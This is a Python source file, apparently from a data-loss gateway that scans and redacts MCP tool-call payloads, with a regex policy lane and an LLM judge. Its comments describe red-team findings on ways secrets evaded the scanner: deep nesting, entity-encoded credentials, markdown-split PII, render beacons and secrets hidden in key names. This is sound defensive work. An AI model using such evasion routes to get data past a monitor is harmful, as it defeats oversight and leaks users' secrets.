_TIER1_OFFLOAD_THRESHOLD = int(os.environ.get("MCP_TIER1_OFFLOAD_BYTES", str(64 * 1024)))


async def _scan_text_tier1(
    text: str,
    *,
    scan_direction: str,
    enforcement: str,
    full_payload: Any,
    org_slug: str,
    server_slug: str,
    tool_name: str,
    actor: dict[str, Any] | None = None,
    include_policies: bool = True,
    include_presets: bool = True,
) -> tuple[str, list[McpFinding], bool, list[str]]:
    """Async entrypoint for the CPU-bound Tier-1 scan. Offloads a LARGE input to a worker
    thread (CHG-0103) so the synchronous regex scan never blocks the event loop under load;
    a small input runs inline to avoid thread-pool pressure. Same signature/return as the
    prior async function, so callers + tests are unchanged.

    ``include_policies``/``include_presets`` (Phase 1, 2026-07-23) select the Tier-1 lane —
    see ``_scan_text_tier1_sync``. Default (both True) is the original combined behaviour."""
    _kwargs = dict(
        scan_direction=scan_direction, enforcement=enforcement, full_payload=full_payload,
        org_slug=org_slug, server_slug=server_slug, tool_name=tool_name, actor=actor,
        include_policies=include_policies, include_presets=include_presets,
    )
    if len(text) > _TIER1_OFFLOAD_THRESHOLD:
        return await asyncio.to_thread(_scan_text_tier1_sync, text, **_kwargs)
    return _scan_text_tier1_sync(text, **_kwargs)


# Bound the structured-redaction walk so a pathologically deep payload can't
# RecursionError mid-scan (the input path has no upstream depth guard; the result
# floor does). Past the cap, leaves are returned unredacted rather than crashing —
# the preset pass (its own scope) and, for the result direction, the E12 floor still
# run, so this is a depth backstop, not a silent redaction skip for normal payloads.
# Aligned to policy_engine._KEY_COLLECT_MAX_DEPTH (500): the DETECTION walk admits depth 500, so a
# lower REDACTION cap (was 200) left a secret nested 201-500 deep DETECTED-but-unmasked → it egressed
# raw under the Phase-3 observe-only path while the live blob scan masked it (B2/B3 red-team finding).
# Matching the caps makes detection⟺redaction consistent (no cannot-mask window); a secret past 500
# is unseen by BOTH (consistent). Recursion at 500 is safe under CPython's 1000-frame default even
# beneath a deep async stack (verified); a pathological over-limit fails CLOSED (the request errors —
# no raw egress), never leaks.
_MCP_POLICY_REDACT_MAX_DEPTH = 500


def _compile_key_matcher(key: str) -> tuple[str, tuple[str, ...]] | None:
    """Compile a scope=key ``key`` into a leaf-path matcher, mirroring the detection binders:
    a DOTTED key → ("dot", parts) prefix-from-root (``_collect_dot_path_values``); a plain key →
    ("name", (name,)) matched at ANY depth (``_collect_key_values``). Returns None for an empty key."""
    key = str(key or "").strip()
    if not key:
        return None
    if "." in key:
        parts = tuple(_normalize_key(p) for p in key.split(".") if p)
        return ("dot", parts) if parts else None
    return ("name", (_normalize_key(key),))


def _key_matcher_covers(matcher: tuple[str, tuple[str, ...]], path: tuple[str, ...]) -> bool:
    kind, parts = matcher
    if kind == "dot":
        return path[:len(parts)] == parts
    return parts[0] in path  # plain key name matched at any depth


def _redact_structured_leaves(payload: Any, hints: list[dict[str, Any]],
                              *, neutralize: bool = False,
                              neutralize_keys: list[str] | None = None) -> tuple[Any, bool]:
    """Apply policy ``redaction_hints`` to every STRING LEAF of ``payload`` IN PLACE,
    preserving structure.

    RENDER-LEAK FLOOR (B1, 2026-07-23): when ``neutralize`` is set (an enforcing entire-scope
    DETECTOR rule is applicable — ``EvaluationResult.render_floor``), each string leaf is run
    through ``_neutralize_render_leaks`` — the SAME encoded-PII / markdown-split / zero-click
    exfil-beacon neutralization the live PRESET pass applied under an enforcing posture
    (CHG-0096/0099). Without it, once Phase 3 retires the posture the seeded detector policy
    forwards an HTML-entity-encoded credential/PII / render beacon RAW (a LEAK), because the
    class masker never sees the encoded surface — and the class DETECTION can't match it either,
    so the rule doesn't even fire. Runs BEFORE the class ``apply_redaction`` so the beacon's
    payload is still visible (mirrors the preset's ``_neutralize_exfil_deep`` → ``redact_all``
    order). It is a MASK transform only — a STRICT no-op on benign leaves — and never blocks, so
    the frozen "redact/floor never escalates to block" invariant holds.

    SCOPED FLOOR (B2, 2026-07-23): ``neutralize_keys`` carries the ``key`` paths of enforcing
    scope=KEY detector rules (``EvaluationResult.render_floor_keys``). The render-leak floor then
    runs ONLY on leaves UNDER those keys — so an encoded credential / zero-click beacon inside the
    operator's key-scoped field is neutralized (parity with the live posture, whose scoped preset
    pass ran the neutralizers on that field) WITHOUT touching siblings. Without this a key-scoped
    redact rule left encoded/beacon content in its own protected field egressing raw at cutover.

    CRITICAL (2026-07-23): the previous policy pass serialized the whole payload to a
    JSON string, ran ``apply_redaction`` (a blind ``regex.sub``) over it, and reparsed
    with ``json.loads``. An operator-authored replacement containing a ``"`` — or a
    non-anchored redact regex (e.g. ``Bearer\\s+.*``) that swallows a JSON delimiter —
    produced INVALID json, and ``extract_and_bind``'s ``_set_entire`` silently stored the
    raw corrupted STRING as the payload. That (a) forwarded a garbled string where the
    JSON-RPC ``arguments`` object belongs and (b) collapsed the key-scoped preset + Tier-2
    passes to ZERO targets (a string is not a dict), silently disabling all downstream
    scanning. Redacting leaves in place can never corrupt structure or drop a type — each
    string leaf is a str in and a str out. Returns ``(new_payload, changed)``.

    NUMERIC LEAVES (2026-07-23): detection runs on the SERIALIZED payload, so a secret
    transmitted as a JSON NUMBER (an SSN/card/account/PIN as an integer — common in MCP
    tool args/results) IS detected and reported redacted, but a str-only walk would skip
    masking it → the raw number egresses while findings claim a redact fired (a silent
    under-redaction LEAK). So a non-string scalar is stringified, run through the same
    redaction, and — only if it actually changed — returned as the masked STRING (a masked
    number cannot remain a number; the same type tradeoff CHG-0046 accepted for the preset
    pass). An UNMATCHED number keeps its original numeric type.

    ``hit_cap`` is True if the walk stopped at a leaf below ``_MCP_POLICY_REDACT_MAX_DEPTH``
    (a pathologically nested payload) — the caller fails CLOSED rather than forward that
    subtree unredacted, since the policy lane has no downstream backstop. Returns
    ``(new_payload, changed, hit_cap)``.

    SCOPE=KEY (B2, 2026-07-23): a hint carrying ``scope=key`` is applied ONLY to leaves UNDER its
    ``key`` path. The previous walk applied EVERY hint to EVERY leaf, so a key_path-scoped detector
    rule (which the live posture scopes to a single field via ``extract_and_bind(key_path=...)``)
    OVER-MASKED sibling fields the posture forwards raw. A leaf's path is the tuple of NFKC-casefolded
    dict keys from the root. Matching MIRRORS the two detection binders exactly:
      * a DOTTED ``key`` (``args.body``) is a path FROM ROOT (``_collect_dot_path_values``) — covered
        iff the key parts are a PREFIX of the leaf path;
      * a plain ``key`` (``title``) is a key NAME matched at ANY depth (``_collect_key_values`` —
        recursive key-name walk) — covered iff that name appears as ANY segment of the leaf path.
    Using a prefix match for a plain key would only mask a TOP-LEVEL key, leaving a nested match
    detected-but-unmasked → a spurious cannot-mask block. ``scope=entire`` applies to every leaf.

    LISTS are TRANSPARENT to the key path (a path part matches inside each list item, parity with
    the ``_collect_dot_path_values`` detection binding), so a key_path value nested in a list is
    best-effort MASKED — NOT forwarded raw. The live posture, whose dict-only setter cannot write
    through a list, instead fails CLOSED and BLOCKS that call (cannot-mask). Under Phase 3 the policy
    lane runs observe-only (``tag``), where the frozen contract forbids blocking, so best-effort
    masking of the maskable keyed value is the correct — and strictly safer — Phase-3 equivalent (no
    raw egress; siblings still preserved). This is the one intended posture→observe divergence."""
    changed = False
    hit_cap = False

    # Split hints once: entire-scope apply everywhere; key-scope carry their compiled matcher.
    entire_hints: list[dict[str, Any]] = []
    keyed_hints: list[tuple[tuple[str, tuple[str, ...]], dict[str, Any]]] = []
    for h in hints:
        km = _compile_key_matcher(h.get("key") or "") if (isinstance(h, dict) and h.get("scope") == "key") else None
        if km is not None:
            keyed_hints.append((km, h))
        else:
            entire_hints.append(h)

    # B2 scoped floor: compile the key-scoped render-floor keys into leaf-path matchers.
    neu_matchers = [m for m in (_compile_key_matcher(k) for k in (neutralize_keys or [])) if m is not None]

    # B3: DETECTOR hints also mask a secret smuggled as a JSON KEY NAME (by rename) — parity with
    # the live blob scan, which detection now matches via _leaf_key_names (agreement, no cannot-mask).
    # Only DETECTOR hints (class patterns) — keyword/regex keys are never scanned (PR#19 stays fixed).
    # Entire-scope detector hints rename ANY key; a key-scoped detector hint renames keys only in the
    # dict at/under its key path (B3 red-team finding A: a secret key name inside a key_path field).
    entire_detector_hints = [h for h in entire_hints
                             if isinstance(h, dict) and (h.get("config") or {}).get("detector_class")]
    keyed_detector_hints = [(km, h) for km, h in keyed_hints
                            if (h.get("config") or {}).get("detector_class")]

    def _hints_for(path: tuple[str, ...]) -> list[dict[str, Any]]:
        if not keyed_hints:
            return hints  # fast path: no key-scoped hints → original behavior
        applicable = list(entire_hints)
        for km, h in keyed_hints:
            if _key_matcher_covers(km, path):
                applicable.append(h)
        return applicable

    def _neutralize_at(path: tuple[str, ...]) -> bool:
        if neutralize:
            return True  # entire-scope floor
        return any(_key_matcher_covers(m, path) for m in neu_matchers)  # scoped floor

    def _walk(node: Any, depth: int, path: tuple[str, ...]) -> Any:
        nonlocal changed, hit_cap
        if depth > _MCP_POLICY_REDACT_MAX_DEPTH:
            # Integration red-team wf_21ddb986 #4: a secret nested past the recursion cap must NOT
            # fail closed — that ESCALATED redact→block (frozen violation) and diverged from the live
            # preset, which masks the serialized blob depth-INDEPENDENTLY.
            # Operator-control #4 (scope fidelity): honor SCOPE at the cap too — only mask the residual
            # when a hint applies HERE (an entire hint, or a key hint whose path covers this node) or
            # the render-leak floor covers it; else forward the scoped-out deep subtree RAW (a
            # key-scoped rule must never mask a sibling that merely sits past the depth cap).
            if _hints_for(path) or _neutralize_at(path):
                _ser = _safe_json(node)
                # red-team wf_e7dda121: mirror the normal-depth leaf path — run the render-leak
                # neutralizer (encoded-PII / zero-click beacon / markdown-split) BEFORE redact_all
                # when the floor covers this path, since redact_all is blind to an HTML-entity-encoded
                # surface. Without it an encoded credential nested past the cap under an enforcing
                # floor egressed RAW.
                _work = _neutralize_render_leaks(_ser) if _neutralize_at(path) else _ser
                _masked = redact_all(_work)
                if _masked != _ser:
                    changed = True
                    return _masked
            return node
        if isinstance(node, str):
            new = _neutralize_render_leaks(node) if _neutralize_at(path) else node
            new = apply_redaction(new, _hints_for(path))
            if new != node:
                changed = True
            return new
        if isinstance(node, list):
            # A list is TRANSPARENT to the key path (a path part matches inside each list item,
            # parity with _collect_dot_path_values) — do not extend ``path``.
            return [_walk(x, depth + 1, path) for x in node]
        if isinstance(node, dict):
            # Detector hints that mask a KEY NAME here: entire-scope (any key) + key-scoped hints
            # whose path covers THIS dict (a secret key inside the operator's protected field).
            key_detector_hints = entire_detector_hints
            if keyed_detector_hints:
                key_detector_hints = list(entire_detector_hints) + [
                    h for km, h in keyed_detector_hints if _key_matcher_covers(km, path)]
            new_dict: dict[Any, Any] = {}
            for k, v in node.items():
                nk = k
                if key_detector_hints and isinstance(k, str):
                    mk = apply_redaction(k, key_detector_hints)
                    if mk != k:  # a secret in the KEY NAME → mask it (rename), like the live blob scan
                        nk = mk
                        changed = True
                # The VALUE keeps the ORIGINAL key in its path (key rename never shifts scoping).
                new_dict[nk] = _walk(v, depth + 1, path + (_normalize_key(k),))
            return new_dict
        # Numeric scalar (int/float — NOT bool, whose "true"/"false" carries no secret):
        # stringify, redact, and mask only if a hint actually matched.
        if isinstance(node, (int, float)) and not isinstance(node, bool):
            as_text = _safe_json(node)
            new = apply_redaction(as_text, _hints_for(path))
            if new != as_text:
                changed = True
                return new
            return node
        return node

    return _walk(payload, 0, ()), changed, hit_cap


def _mcp_policy_pass_sync(
    full_payload: Any,
    *,
    policies: list[dict[str, Any]],
    serialized: str,
    scan_direction: str,
    enforcement: str,
    tool_name: str,
    actor: dict[str, Any] | None,
) -> tuple[Any, list[McpFinding], bool, list[str], bool]:
    """Tier-1 POLICY lane over the FULL structured payload (Phase 1, decoupled from the
    scan-control target binding). DETECTION uses the serialized payload (read-only);
    REDACTION is applied to string leaves via ``_redact_structured_leaves`` — never a
    serialize-and-reparse round trip. Returns
    ``(new_payload, findings, blocked, redaction_fields, redacted)``. ``policies`` is
    resolved (and emptiness short-circuited) by the async wrapper so a zero-policy org
    never pays the full-payload serialization."""
    if not serialized or not policies:
        return full_payload, [], False, [], False
    context = _build_mcp_context(serialized, scan_direction=scan_direction, full_payload=full_payload)

    eval_result = evaluate_mcp_policies(policies, context, tool_name=tool_name or None, actor=actor)
    # B1/B2: an enforcing detector rule can arm the render-leak floor WITHOUT any class match
    # (an HTML-entity-encoded credential the class detector can't see) — so the no-match
    # short-circuit must also check ``render_floor`` (entire) and ``render_floor_keys`` (scoped),
    # else the encoded secret egresses raw.
    if not eval_result.matched_rule_ids and not eval_result.render_floor and not eval_result.render_floor_keys:
        return full_payload, [], False, [], False

    findings = _findings_from_policy_eval(eval_result, scan_direction=scan_direction, text=serialized)
    rfields = list(eval_result.redaction_fields)
    posture = (enforcement or "").strip().lower()
    # A rule authored action='block' is an explicit block intent honored under any
    # non-monitor posture; a block posture is a floor over any matched rule.
    if _enforce_blocks(enforcement) or (eval_result.action == "block" and posture != "monitor"):
        return full_payload, findings, True, rfields, False
    # B1 render-leak floor: a posture-replicating enforcing entire-scope DETECTOR rule is
    # applicable → neutralize encoded-PII / markdown-split / exfil-beacon surfaces on the leaves,
    # a MASK the live posture applied as a floor independent of class match. Gated on the same
    # observe-only rule the redact branch uses (a 'monitor' posture withholds mutation); a 'tag'
    # posture (the Phase-3 world) still neutralizes, because the DETECTOR rule — not the retired
    # posture — is the enforcer. Never blocks.
    render_floor = bool(eval_result.render_floor) and posture != "monitor"
    # B2 scoped floor: key-scoped detector rules neutralize only their own field's leaves.
    neutralize_keys = list(eval_result.render_floor_keys) if posture != "monitor" else []
    # Policy-authored redact applies whenever matched (not only under a redact posture);
    # skipped only under an explicit observe-only 'monitor'.
    if eval_result.action == "redact" and eval_result.redaction_hints and posture != "monitor":
        new_payload, changed, hit_cap = _redact_structured_leaves(
            full_payload, eval_result.redaction_hints, neutralize=render_floor,
            neutralize_keys=neutralize_keys)
        # CANNOT-MASK FAIL-CLOSED (2026-07-23): the operator's redact rule MATCHED (detection
        # runs on the serialized payload) but the leaf-walk could not mask it — either the
        # match spans a JSON boundary / structural context no single leaf reproduces (e.g. a
        # regex requiring ``"key":"...")``, or the payload nests past the depth cap. The
        # policy lane has NO downstream backstop: its findings carry threat_type='redact',
        # which the E12 result-redaction floor's _findings_have_secret_or_pii never matches,
        # so forwarding raw is a SILENT leak while telemetry claims a redact fired. Withhold
        # instead — the "cannot mask" exception (a system limitation, mirroring the existing
        # masking-crash fail-closed), NOT a redact->block escalation of MASKABLE content
        # (maskable matches redact + forward as before). Numeric leaves are masked above, so
        # this fires only for the genuinely-unmaskable residual (structural regex / deep nest).
        # TAG NEVER BLOCKS (2026-07-23): gate on _is_observe_only_posture, NOT the literal
        # ``posture != "monitor"`` above — the frozen contract makes ``tag`` an alias of
        # ``monitor`` for BLOCKING (a3714946 / 4fdf7fcf: "tag/monitor never block"). Under an
        # observe-only posture the operator chose NOT to enforce, so an unmaskable match is
        # forwarded (best-effort redact of what WAS maskable still applied), never blocked —
        # the cannot-mask fail-closed is an ENFORCING-posture behaviour only.
        if (hit_cap or not changed) and not _is_observe_only_posture(enforcement):
            return full_payload, findings, True, rfields, False
        return new_payload, findings, False, rfields, changed
    # STANDALONE render-leak floor: an enforcing detector rule applies but its CLASS did not
    # match this payload (e.g. an HTML-entity-encoded credential/PII a redact rule can't
    # class-detect, or an encoded generic-PII / beacon under a block rule that the #3 exclusion
    # kept from blocking). Neutralize the render-leak surface on the leaves — a MASK only, never
    # a block — so the encoded secret / beacon does not egress raw once the posture is retired.
    if render_floor or neutralize_keys:
        new_payload, changed, _hc = _redact_structured_leaves(
            full_payload, [], neutralize=render_floor, neutralize_keys=neutralize_keys)
        if changed:
            findings.append(McpFinding(
                entity_type="render_reconstruction", score=0.9, start=0, end=len(serialized),
                direction=_direction_label(scan_direction), tier="tier1", threat_type="exfil",
                detail=("Neutralized a render-time reconstruction leak (zero-click exfil beacon "
                        "/ encoded-PII / markdown-split PII-secret) via the seeded detector floor"),
            ))
            return new_payload, findings, False, rfields, True
    return full_payload, findings, False, rfields, False


async def _mcp_policy_pass(
    full_payload: Any,
    *,
    scan_direction: str,
    enforcement: str,
    org_slug: str,
    server_slug: str,
    tool_name: str,
    actor: dict[str, Any] | None,
) -> tuple[Any, list[McpFinding], bool, list[str], bool]:
    """Async wrapper: resolve the org's MCP policies FIRST and short-circuit a zero-policy
    org BEFORE serializing (so it never pays the full-payload ``_safe_json`` cost the old
    entire-binding always paid); then offload the policy lane to a worker thread for a
    LARGE payload (detection regex + leaf walk are CPU-bound), inline otherwise."""
    policy_sync = _get_policy_sync()
    if policy_sync is None or not org_slug or not server_slug:
        return full_payload, [], False, [], False
    try:
        policies = policy_sync.get_policies_for_server(org_slug, server_slug, domain="mcp")
    except Exception as exc:
        LOG.warning("MCP policy bundle lookup failed: %s", exc)
        policies = []
    if not policies:
        return full_payload, [], False, [], False

    serialized = full_payload if isinstance(full_payload, str) else _safe_json(full_payload)
    kw = dict(
        policies=policies, serialized=serialized, scan_direction=scan_direction,
        enforcement=enforcement, tool_name=tool_name, actor=actor,
    )
    if len(serialized) > _TIER1_OFFLOAD_THRESHOLD:
        return await asyncio.to_thread(_mcp_policy_pass_sync, full_payload, **kw)
    return _mcp_policy_pass_sync(full_payload, **kw)


async def _scan_text_tier2(
    text: str,
    *,
    scan_direction: str,
    enforcement: str,
    scanner,
    org_slug: str,
    org_tier2_override: bool | None,
    org_tier2_strict: bool,
    strict_mode: str,
    policy_only: bool = False,
) -> tuple[str, list[McpFinding], bool, str | None]:
    """Tier-2 Bedrock scan. Returns (text, findings, blocked, fallback_reason)."""
    if scanner is None:
        return text, [], False, "scanner_unavailable"

    mcp_dir = _direction_label(scan_direction)
    try:
        verdict = await scanner.scan_prompt_with_tier2(
            text,
            org_tier2_override=org_tier2_override,
            org_slug=org_slug,
            org_tier2_strict=org_tier2_strict,
        )
    except Exception as exc:
        LOG.warning("MCP Tier-2 scan failed: %s", exc)
        # Pure Tier-2 on/off (operator model, 2026-07-24): Tier-2 is a verdict-authoritative judge
        # with NO operator action gate. A scanner CRASH produces no verdict, so Tier-2 cannot judge —
        # it fails OPEN (never blocks a call the model never ruled on). Tier-1 policies already
        # enforced this call, so the operator's own rules still gated it. No per-scope action or
        # strict DEFAULT blocks here (invariant A: no defaults; F: the verdict decides). Mirrors the
        # scanner=None fail-open twin.
        if policy_only:
            return text, [], False, "tier2_error_fail_open"
        # Legacy (flag OFF): observe-only never blocks; an enforcing posture + strict fails closed.
        if strict_mode == "strict" and not _is_observe_only_posture(enforcement):
            return text, [], True, "tier2_error_strict"
        return text, [], False, "tier2_error_fail_open"

    findings: list[McpFinding] = []
    if verdict.tier and "tier" in verdict.tier.lower() and verdict.tier != "tier_1":
        if verdict.action in ("block", "redact", "flag"):
            findings.append(
                McpFinding(
                    entity_type=verdict.threat_type or "bedrock",
                    score=verdict.confidence,
                    start=0,
                    end=len(text),
                    direction=mcp_dir,
                    tier="tier2",
                    threat_type=verdict.threat_type,
                    detail=verdict.detail,
                )
            )
    if policy_only:
        # Pure Tier-2 on/off (operator model, 2026-07-24): when the operator enables Tier-2 its
        # VERDICT is authoritative — there is NO operator action gate (Tier-2 is on/off only). The
        # ZeroShield model decides per call:
        #   block  -> block + the judge's reason (finding.detail);
        #   redact -> mask (redact_all);
        #   flag   -> flag-for-review: recorded in `findings` above, allowed, NEVER blocks;
        #   allow  -> pass.
        if verdict.action == "block":
            return text, findings, True, None
        if verdict.action == "redact":
            return redact_all(text), findings, False, None
        return text, findings, False, None
    if _enforce_blocks(enforcement) and verdict.action in ("block", "redact", "flag"):
        # A4 FIX (Tier-2 parity): block posture blocks on any actionable Bedrock
        # verdict, not only verdict.action == "block".
        return text, findings, True, None
    if enforcement == "redact" and verdict.action in ("redact", "block"):
        return redact_all(text), findings, False, None
    return text, findings, False, None


async def scan_mcp_payload(
    payload: Any,
    *,
    scan_direction: str,
    enforcement: str,
    effective_controls: dict[str, Any],
    enabled_info: dict[str, Any] | None = None,
    org_slug: str = "",
    server_slug: str = "",
    tool_name: str = "",
    actor: dict[str, Any] | None = None,
    extra_redaction_fields: list[str] | None = None,
) -> tuple[Any, McpScanResult]:
    """Run Tier-1 then conditional Tier-2 on ``payload`` for input or output.

    ``actor`` (M-04): optional {user_id, agent_id, roles} identity used to
    scope actor-allowlisted MCP policies during Tier-1 evaluation.

    ``extra_redaction_fields`` (3b cross-stage): named fields to mask on the
    OUTPUT in addition to any this scan's own policy matches declare. The caller
    threads the INPUT scan's ``policy_redaction_fields`` here so an input-stage
    policy match projects those fields out of the RESPONSE — control HTTP-path
    parity for the RBAC "role X never sees field F" pattern (the rule fires on the
    call, not the response). Ignored on the input direction.
    """
    result = McpScanResult()
    tier1_ctrl = _effective_control(effective_controls, "tier1", scan_direction)
    tier2_ctrl = _effective_control(effective_controls, "tier2", scan_direction)
    # PHASE 3: retire the posture / scan-control ACTION as the TIER-1 (preset) enforcement input.
    # Coerce the Tier-1 action to the observe-only ``tag`` — the exact world the pre-cutover
    # diff-gate proved the seeded POLICY rules reproduce. The preset pass then only DETECT+TAG; the
    # policy lane (rule-action-driven, unaffected because ``tag`` != ``monitor``) is the sole Tier-1
    # enforcer. TIER-2 (the LLM judge) is operator-controlled independently: its ENABLE toggle and
    # its OWN action are kept (the Tier-2-only settings model), but under the flag its action no
    # longer FALLS BACK to the retired server posture (operator-control #6) and it honors its own
    # verdict directly (#7) — see the tier2 block below. scan-control enabled/direction/scope and
    # Tier-2 enable gating are unchanged; the Tier-1 preset ACTION is dropped. OFF by default.
    _policy_only = _mcp_policy_only_enforcement(enabled_info)
    # Per-tier action: each tier's control row owns its action; 'inherit'/unset
    # defers to the server/tool action passed as ``enforcement``.
    tier1_action = "tag" if _policy_only else _resolve_tier_action(tier1_ctrl, enforcement)
    result_redacted = False
    # 3b: accumulate the named response fields that matched actor-scoped policies
    # declared for RBAC masking (deduped, order-preserving). Applied to the
    # structured OUTPUT payload at each non-blocked return via _finalize_output —
    # this closes the "adapter path does content-scan but no field-level RBAC
    # masking" gap (BACKSTOP finding #1); the HTTP path already masks these fields.
    field_redaction_union: list[str] = []

    def _finalize_output(out_payload: Any) -> Any:
        """Mask per-policy ``redaction_fields`` on the OUTPUT payload.

        Parity with the control HTTP path (apply_field_redaction): applies ONLY
        on the output direction, only when a matched policy declared fields (this
        scan's own matches PLUS the caller-threaded ``extra_redaction_fields`` from
        the input stage), and NOT under a 'monitor' posture (observe-only). A
        'block' posture already withheld the payload upstream, so field masking
        never runs on a blocked call. Records the masked field set + a scan-trace
        stage for audit ONLY when a named field was actually present (identity
        no-op otherwise — so a caller never mislabels an unchanged result).
        """
        if scan_direction != "output":
            return out_payload
        mask_fields = list(field_redaction_union)
        for _rf in (extra_redaction_fields or []):
            if isinstance(_rf, str) and _rf and _rf not in mask_fields:
                mask_fields.append(_rf)
        if not mask_fields:
            return out_payload
        # Pure observe-only ``monitor`` skips field RBAC; ``tag`` still honors
        # policy-declared redaction_fields (cross-stage RBAC projection).
        if (enforcement or "").strip().lower() == "monitor":
            return out_payload
        masked = apply_field_redaction(out_payload, mask_fields)
        if masked is out_payload:
            return out_payload  # none of the named fields present -> true no-op
        result.redacted_fields = mask_fields
        result.scan_trace.append(
            {
                "scan_stage": "field_redaction",
                "tier": "tier1",
                "direction": scan_direction,
                "fields": list(mask_fields),
                "policy_engine": True,
            }
        )
        return masked

    _tier1_enabled = tier1_ctrl.get("enabled", True)
    if not _tier1_enabled:
        result.scan_trace.append(
            {
                "scan_stage": "tier1_skipped",
                "tier": "tier1",
                "direction": scan_direction,
                "enabled": False,
            }
        )
        # red-team wf_d8062c0d F1 (operator-control): a DISABLED Tier-1 direction must NOT silently
        # drop an operator-ENABLED Tier-2 for the SAME direction — Tier-2 is an INDEPENDENT operator
        # on/off, so its explicit enable is honored. We skip only the Tier-1 policy + preset passes
        # below (gated on _tier1_enabled); if Tier-2 is also off, nothing runs and we return here.
        if not tier2_ctrl.get("enabled", False):
            return payload, result

    # ── Tier-1 POLICY pass (Phase 1, 2026-07-23): evaluate policies ONCE against the
    # FULL payload using each policy's OWN scope, DECOUPLED from the scan-control target
    # binding below. A policy authored ``scope=entire`` now sees the whole payload and its
    # redaction lands on the payload's string leaves — closing the detect-wide/mutate-narrow
    # raw-egress leak where a key-scoped scan-control silently narrowed an entire-scope
    # redact policy so a secret in a sibling field egressed raw, undetected and untagged.
    # Redaction is applied IN-PLACE to string leaves (never a serialize-and-reparse round
    # trip), so a policy redaction can never corrupt the payload structure or drop it to a
    # raw string — which would have silently disabled the key-scoped preset + Tier-2 passes.
    # Runs only for an ENABLED tier1 direction (after the disabled-skip above), so direction
    # isolation is preserved. The scan-control scope still governs the PRESET pass that
    # follows; each surface honours its OWN operator-selected scope.
    # Tier-1 policy + preset passes run ONLY for an enabled Tier-1 direction. A disabled direction
    # (that reached here because Tier-2 is enabled) contributes no Tier-1 findings and falls through
    # to the Tier-2 lane below, honoring the operator's independent Tier-2 enable.
    pol_payload, pol_findings, pol_blocked, pol_rfields, pol_redacted = (payload, [], False, [], False)
    if _tier1_enabled:
        pol_payload, pol_findings, pol_blocked, pol_rfields, pol_redacted = await _mcp_policy_pass(
            payload,
            scan_direction=scan_direction,
            enforcement=tier1_action,
            org_slug=org_slug,
            server_slug=server_slug,
            tool_name=tool_name,
            actor=actor,
        )
    for _rf in pol_rfields:
        if _rf not in field_redaction_union:
            field_redaction_union.append(_rf)
    result.findings.extend(pol_findings)
    if pol_findings:
        for f in pol_findings:
            result.compliance_tags = _merge_tags(
                result.compliance_tags, _tags_for_finding(f)
            )
        # F3 AUDIT HONESTY: under the Phase-3 flag ``tier1_action`` is the observe-only ``tag``,
        # but the POLICY lane still enforces via the rule's own action. ``monitored`` means "nothing
        # was enforced" — so it is set ONLY when the policy neither blocked nor redacted (else an
        # enforced call would be mislabelled observe-only), and the trace ``action`` below reflects
        # the POLICY's real enforcement, not the coerced tier action.
        if _is_observe_only_posture(tier1_action) and not pol_blocked and not pol_redacted:
            result.monitored = True
    if pol_blocked:
        result.blocked = True
        result.scan_trace.append(
            {
                "scan_stage": "tier1_policy", "tier": "tier1",
                "direction": scan_direction, "scope": "entire",
                "action": "block", "blocked": True,
                "finding_count": len(pol_findings), "policy_engine": True,
            }
        )
        return payload, result
    if pol_redacted:
        result_redacted = True
        payload = pol_payload  # thread the policy-redacted payload into the preset pass
    if pol_findings:
        result.scan_trace.append(
            {
                "scan_stage": "tier1_policy", "tier": "tier1",
                "direction": scan_direction, "scope": "entire",
                "action": ("redact" if pol_redacted else tier1_action),
                "finding_count": len(pol_findings), "policy_engine": True,
            }
        )

    # Bind the payload to the ACTIVE tier's scope: Tier-1's when it runs, else (Tier-1 disabled +
    # Tier-2 enabled) Tier-2's OWN scope, so Tier-2 honors the operator's Tier-2 target selection.
    _scope_ctrl = tier1_ctrl if _tier1_enabled else tier2_ctrl
    target_mode = _scope_ctrl.get("target_mode") or "entire"
    key_path = _scope_ctrl.get("key_path") or ""
    state_ref, targets = extract_and_bind(
        payload,
        target_mode=target_mode,
        key_path=key_path,
    )

    scanner = _get_input_scanner()
    tier1_blocked = False

    for text, setter, path_label in (targets if _tier1_enabled else []):
        if not text:
            continue
        # PRESET pass only — the POLICY lane already ran once on the full payload above.
        new_text, findings, blocked, rfields = await _scan_text_tier1(
            text,
            scan_direction=scan_direction,
            enforcement=tier1_action,
            full_payload=state_ref[0],
            org_slug=org_slug,
            server_slug=server_slug,
            tool_name=tool_name,
            actor=actor,
            include_policies=False,
            include_presets=True,
        )
        for _rf in rfields:
            if _rf not in field_redaction_union:
                field_redaction_union.append(_rf)
        result.findings.extend(findings)
        if findings:
            for f in findings:
                result.compliance_tags = _merge_tags(
                    result.compliance_tags, _tags_for_finding(f)
                )
            # F3: observe-only only if nothing has enforced yet (a prior policy block/redact means
            # the call WAS enforced — don't mislabel it observe-only).
            if _is_observe_only_posture(tier1_action) and not result.blocked and not result_redacted:
                result.monitored = True
        if blocked:
            tier1_blocked = True
        _policy_driven_redact = any(f.threat_type == "redact" for f in findings)
        if new_text != text and not blocked and (
            tier1_action == "redact" or _policy_driven_redact
        ):
            # CHG-0047: fail-closed no-op-scrub guard (egress bytes are the only
            # source of truth). Tier-1 produced a redaction (new_text != text);
            # VERIFY the setter actually applied it by comparing the payload bytes
            # before/after. A setter that silently no-ops (e.g. a best-effort
            # mutator on an exotic nested path) would otherwise leave the RAW value
            # in the payload while result_redacted claims a scrub — the CHG-0046
            # class of leak. If the payload did not change, BLOCK rather than egress
            # an un-scrubbed result. Complements CHG-0046 (which made the known
            # non-string setters real) by catching ANY residual no-op scrub.
            _before = _safe_json(state_ref[0])
            setter(new_text)
            result_redacted = True
            if _safe_json(state_ref[0]) == _before:
                tier1_blocked = True
                result.scan_trace.append(
                    {
                        "scan_stage": "noop_scrub_failclosed",
                        "tier": "tier1",
                        "direction": scan_direction,
                        "target_mode": target_mode,
                        "key_path": path_label,
                        "reason": "redaction_setter_noop_raw_survived",
                    }
                )
        result.scan_trace.append(
            {
                "scan_stage": "tier1",
                "tier": "tier1",
                "direction": scan_direction,
                "target_mode": target_mode,
                "key_path": path_label,
                "strict_mode": tier1_ctrl.get("strict_mode"),
                "action": tier1_action,
                "effective_control_id": tier1_ctrl.get("control_id"),
                "finding_count": len(findings),
                "policy_engine": True,
            }
        )

    # 3b cross-stage: surface the field names THIS scan's matched policies
    # declared (both directions) so the caller can project them out of the paired
    # RESPONSE. Set from the this-scan union only (NOT extra_redaction_fields).
    result.policy_redaction_fields = list(field_redaction_union)

    if tier1_blocked:
        result.blocked = True
        result.monitored = False  # F3: a blocked call is never observe-only
        return payload, result

    mutable = state_ref[0]

    if not tier2_ctrl.get("enabled", False):
        return _finalize_output(mutable if result_redacted else payload), result

